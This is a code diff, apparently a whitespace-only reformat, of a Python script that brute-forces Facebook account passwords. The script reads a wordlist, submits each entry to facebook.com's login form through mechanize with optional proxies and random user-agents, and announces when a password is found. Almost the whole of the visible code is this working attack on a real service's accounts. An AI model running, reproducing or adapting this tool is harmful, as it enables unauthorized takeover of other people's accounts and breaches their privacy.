@@ -7,13 +7,12 @@
 #Codedby : Oseid Aldary
 ######################
 ##--------------------- Import Libraries --------------------##
-import socket,time,os,optparse,random,re                     ##
-
+import socket,time,os,optparse,random,re
 try:
   import requests
 except ImportError:
-	print("[!] Error: [ requests ] Module Is Missed \n[*] Please Install it Using this command> [ pip install requests ]")
-	exit(1)
+  print("[!] Error: [ requests ] Module Is Missed \n[*] Please Install it Using this command> [ pip install requests ]")
+  exit(1)
 try:
   import mechanize
 except ImportError:
@@ -42,13 +41,13 @@ def cnet():                                       #
 
 #### Check Proxy ####
 def cpro(ip,port=None):
-	proxy = '{}:8080'.format(ip) if port ==None else '{}:{}'.format(ip,port)
-	proxies = {'https': "https://"+proxy, 'http': "http://"+proxy}
-	try:
-		r = requests.get('https://www.wikipedia.org',proxies=proxies, timeout=5) 
-		if ip==r.headers['X-Client-IP']: return True
-		else : return False
-	except Exception : return False
+  proxy = '{}:8080'.format(ip) if port ==None else '{}:{}'.format(ip,port)
+  proxies = {'https': "https://"+proxy, 'http': "http://"+proxy}
+  try:
+    r = requests.get('https://www.wikipedia.org',proxies=proxies, timeout=5) 
+    if ip==r.headers['X-Client-IP']: return True
+    else : return False
+  except Exception : return False
 #### Choice Random User-Agent ####
 def useragent():
     useragents = [
@@ -89,14 +88,14 @@ def FBOM(username, wordlist, proxy=None):
                     print(wi+"["+gr+"Connected"+wi+"]")
                     useproxy = proxy+":8080"
                 else:
-                	if cpro(proxy, port=80) ==True:
-                		print(wi+"["+gr+"Connected"+wi+"]")
-                		useproxy = proxy+":80"
-                	else:
-                		print(rd+"["+yl+"Connection Failed"+rd+"] !!!"+wi)
-                		useproxy = False
-                		print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTP/S Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
-                		exit(1)
+                  if cpro(proxy, port=80) ==True:
+                    print(wi+"["+gr+"Connected"+wi+"]")
+                    useproxy = proxy+":80"
+                  else:
+                    print(rd+"["+yl+"Connection Failed"+rd+"] !!!"+wi)
+                    useproxy = False
+                    print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTP/S Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
+                    exit(1)
             else:
                 useproxy = False
                 print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+"Invalid IPv4 ["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
@@ -104,23 +103,23 @@ def FBOM(username, wordlist, proxy=None):
         else:
             proxy,port = proxy.split(":")[0],proxy.split(":")[1]
             if proxy.count(".") ==3:
-            	if not port.isdigit() or int(port) <1 or int(port) > 65535:
-            		print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid  Port ["+rd+port+yl+"] Should Be In Range("+wi+"0-65535"+yl+")"+rd+"!!!"+wi)
-            		exit(1)
-            	if cpro(proxy, port=port) == True:
-            		print(wi+"["+gr+"Connected"+wi+"]")
-            		useproxy = proxy+":"+port
-            	else:
-            		print(rd+"["+yl+"Connection Failed"+rd+"] !!!"+wi)
-            		useproxy = False
-            		print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTP/S Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
-            		exit(1)
+              if not port.isdigit() or int(port) <1 or int(port) > 65535:
+                print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid  Port ["+rd+port+yl+"] Should Be In Range("+wi+"0-65535"+yl+")"+rd+"!!!"+wi)
+                exit(1)
+              if cpro(proxy, port=port) == True:
+                print(wi+"["+gr+"Connected"+wi+"]")
+                useproxy = proxy+":"+port
+              else:
+                print(rd+"["+yl+"Connection Failed"+rd+"] !!!"+wi)
+                useproxy = False
+                print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTP/S Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
+                exit(1)
             else:
-            	useproxy = False
-            	print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid IPv4 ["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
-            	exit(1)
+              useproxy = False
+              print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid IPv4 ["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
+              exit(1)
     else:
-    	useproxy = False
+      useproxy = False
     prox = gr+useproxy.split(":")[0]+wi+":"+yl+useproxy.split(":")[1] if useproxy !=False else ""
     proxystatus = prox+wi+"["+gr+"ON"+wi+"]" if useproxy !=False else yl+"["+rd+"OFF"+yl+"]"
     print(gr+"""
@@ -145,37 +144,37 @@ def FBOM(username, wordlist, proxy=None):
     br.addheaders=[('User-agent',useragent())]
     issuccess = 0
     with open(wordlist) as wfile:
-    	for passwd in wfile:
-    		if not passwd.strip() or len(passwd.strip()) < 6: continue
-    		passwd = passwd.strip()
-    		try:
-    			print(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
-    			br.open("https://facebook.com")
-    			br.select_form(nr=0)
-    			br.form["email"]=username
-    			br.form["pass"]=passwd
-    			br.method="POST"
-    			if br.submit().get_data().__contains__('home_icon'):
-    				issuccess = 1
-    				print(wi+"==> Login"+gr+" Success\n")
-    				print(wi+"========================="+"="*len(passwd))
-    				print(wi+"["+gr+"+"+wi+"] Password "+gr+"Found:"+wi+">>>>[ "+gr+"{}".format(passwd))
-    				print(wi+"========================="+"="*len(passwd))
-    				break
-    			else : print(yl+"==> Login"+rd+" Failed\n")
-    			loop+=1
-    		except (KeyboardInterrupt,EOFError):
-    			print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
-    			time.sleep(1.5)
-    			wfile.close()
-    			issuccess = 2
-    			break
-    		except Exception as e:
-    			issuccess = 2
-    			print(rd+"\n["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
-    			time.sleep(0.60)
-    			wfile.close()
-    			break
+      for passwd in wfile:
+        if not passwd.strip() or len(passwd.strip()) < 6: continue
+        passwd = passwd.strip()
+        try:
+          print(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
+          br.open("https://facebook.com")
+          br.select_form(nr=0)
+          br.form["email"]=username
+          br.form["pass"]=passwd
+          br.method="POST"
+          if br.submit().get_data().__contains__('home_icon'):
+            issuccess = 1
+            print(wi+"==> Login"+gr+" Success\n")
+            print(wi+"========================="+"="*len(passwd))
+            print(wi+"["+gr+"+"+wi+"] Password "+gr+"Found:"+wi+">>>>[ "+gr+"{}".format(passwd))
+            print(wi+"========================="+"="*len(passwd))
+            break
+          else : print(yl+"==> Login"+rd+" Failed\n")
+          loop+=1
+        except (KeyboardInterrupt,EOFError):
+          print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
+          time.sleep(1.5)
+          wfile.close()
+          issuccess = 2
+          break
+        except Exception as e:
+          issuccess = 2
+          print(rd+"\n["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
+          time.sleep(0.60)
+          wfile.close()
+          break
     if issuccess ==0:
       print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"I Can't Find The Correct Password In [ "+yl+wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
       print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Other Wordlist File "+gr+":)"+wi)
@@ -234,10 +233,8 @@ def Main():
    else:
        print(parse.usage)
        exit(1)
-
 if __name__=='__main__':
-	Main()
-
+  Main()
 ##############################################################
 #####################                #########################
 #####################   END OF TOOL  #########################
